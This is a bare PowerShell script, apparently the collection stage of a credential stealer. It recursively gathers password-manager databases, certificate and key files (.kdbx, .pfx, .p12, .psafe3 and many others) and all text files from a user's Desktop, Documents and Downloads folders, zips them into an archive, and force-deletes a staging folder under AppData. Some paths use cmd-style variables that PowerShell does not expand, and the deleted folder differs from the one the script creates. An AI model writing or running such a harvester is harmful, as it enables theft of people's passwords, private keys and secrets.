param (
    [Parameter()]
    [String]$dump_file_name
)

mkdir pss_files ; Set-Location pss_files
Get-ChildItem -Path "%USERPROFILE%\Desktop\*" -Include *.txt,*.pfx,*.p12,*.kdb,*.kdbx,*.bpw,*.plk,*.apv,*.apw,*.esf,*.ibak,*.msim,*.mscx,*.npw,*.pfdb,*.pms,*.psafe3,*.psw,*.psw6,*.pswx,*.pwa,*.pwb,*.pwk,*.pwrep,*.pwt,*.rfp,*.rzk,*.spm,*.spdb,*.tks,*.wsp -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\OneDrive\Desktop\*" -Include *.txt,*.pfx,*.p12,*.kdb,*.kdbx,*.bpw,*.plk,*.apv,*.apw,*.esf,*.ibak,*.msim,*.mscx,*.npw,*.pfdb,*.pms,*.psafe3,*.psw,*.psw6,*.pswx,*.pwa,*.pwb,*.pwk,*.pwrep,*.pwt,*.rfp,*.rzk,*.spm,*.spdb,*.tks,*.wsp -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%userprofile%\Documents\*" -Include *.txt,*.pfx,*.p12,*.kdb,*.kdbx,*.bpw,*.plk,*.apv,*.apw,*.esf,*.ibak,*.msim,*.mscx,*.npw,*.pfdb,*.pms,*.psafe3,*.psw,*.psw6,*.pswx,*.pwa,*.pwb,*.pwk,*.pwrep,*.pwt,*.rfp,*.rzk,*.spm,*.spdb,*.tks,*.wsp -Recurse | Copy-Item -Destination .
Get-ChildItem -Path "%USERPROFILE%\Downloads\*" -Include *.txt,*.pfx,*.p12,*.kdb,*.kdbx,*.bpw,*.plk,*.apv,*.apw,*.esf,*.ibak,*.msim,*.mscx,*.npw,*.pfdb,*.pms,*.psafe3,*.psw,*.psw6,*.pswx,*.pwa,*.pwb,*.pwk,*.pwrep,*.pwt,*.rfp,*.rzk,*.spm,*.spdb,*.tks,*.wsp -Recurse | Copy-Item -Destination .

Set-Location ..
Compress-Archive -Path .\pss_files -DestinationPath "$dump_file_name"
Remove-Item -Path "$env:appdata\Microsoft\dump\pss_files" -recurse -Force